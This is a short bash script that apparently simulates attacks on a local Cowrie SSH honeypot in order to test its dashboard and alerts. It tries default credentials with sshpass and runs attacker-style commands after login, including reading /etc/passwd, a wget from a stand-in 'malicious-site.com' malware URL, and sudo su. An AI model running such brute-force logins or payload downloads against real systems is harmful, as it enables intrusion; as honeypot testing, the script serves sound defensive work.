#!/bin/bash

echo "🎯 QUICK ATTACK TEST"
echo "==================="

# Install sshpass if needed
if ! command -v sshpass >/dev/null 2>&1; then
    echo "📦 Installing sshpass..."
    sudo apt update && sudo apt install -y sshpass
fi

echo "🔐 Testing SSH attacks on localhost:2222..."
echo ""

# Test different credentials
credentials=(
    "root:admin"
    "admin:password"
    "user:123456"
    "test:test"
    "ubuntu:ubuntu"
)

for cred in "${credentials[@]}"; do
    username=$(echo $cred | cut -d: -f1)
    password=$(echo $cred | cut -d: -f2)
    
    echo "🔑 Testing $username:$password"
    
    # Attempt SSH connection
    timeout 10 sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 "$username@localhost" << EOF 2>/dev/null
whoami
ls -la
cat /etc/passwd
ps aux
wget http://malicious-site.com/malware.sh
sudo su
exit
EOF
    
    echo "   ✅ Attack attempt completed"
    sleep 2
done

echo ""
echo "🎯 Attack simulation complete!"
echo "📝 Check your dashboard at: http://localhost:3000"
echo "📧 Check your email for alerts!"
echo "📄 Check logs: tail -f /home/cowrie/cowrie/var/log/cowrie/cowrie.json"
